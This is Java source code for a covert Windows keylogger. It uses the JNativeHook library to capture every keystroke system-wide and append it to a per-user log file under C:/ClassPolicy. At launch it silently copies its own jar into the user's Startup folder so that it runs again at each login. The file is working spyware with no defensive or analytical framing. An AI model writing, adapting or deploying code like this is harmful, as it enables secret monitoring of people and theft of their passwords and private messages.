package main;

import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.URISyntaxException;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;

public class Main implements NativeKeyListener{
	public static void main (String[] args) throws IOException, URISyntaxException {
		File yiffyiff = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
		// System.out.println("Location " + yiffyiff);
		String startup = "C:/Users/" + System.getProperty("user.name") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
		// System.out.println("Startup " + startup);
		// System.out.println("Running command " + System.getenv("windir") +"\\system32\\"+"xcopy.exe" + " \"" + yiffyiff + "\"" + " \"" + startup +"\"");
		 @SuppressWarnings("unused")
		//  Process selfcopy = Runtime.getRuntime().exec("cmd /c start cmd.exe /K" + " " + "copy \"" + yiffyiff + "\"" + " \"" + startup +"\"");
		 Process p =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"xcopy.exe" + " \"" + yiffyiff + "\"" + " \"" + startup +"\"");
		 
		File log = new File("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt");
		if(!log.exists()) {
			System.out.println("Creating logfile...");
			System.out.println("Starting...");
			log.createNewFile();
		} else {
			System.out.println("Starting...");
		}
		String fn = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
		PrintWriter timestamper = new PrintWriter(new FileWriter(fn, true));
		timestamper.println();
		timestamper.print("[" + new SimpleDateFormat("EEEE").format(new Date()) + "]");
		timestamper.println();
		timestamper.close();
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		GlobalScreen.getInstance().addNativeKeyListener(new Main());
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		// TODO Auto-generated method stub
	    System.out.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		//if (NativeKeyEvent.getKeyText(e.getKeyCode()).matches("Enter")) {
		//	System.out.print("\n");
		//} else if (NativeKeyEvent.getKeyText(e.getKeyCode()).matches("Space")) {
		//	System.out.print(" ");
		//} else {
		//	System.out.print(NativeKeyEvent.getKeyText(e.getKeyCode()));
		//}
		record(NativeKeyEvent.getKeyText(e.getKeyCode()));
		}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}
	public static void record(String x) {
		try {
			String filename = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
			PrintWriter out = new PrintWriter(new FileWriter(filename, true));
			// System.out.println("rec " + x);
			if(x.matches("Space")) {
				out.print(" ");
				out.close();
			} else {
			out.print(x);
			out.close();
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
}
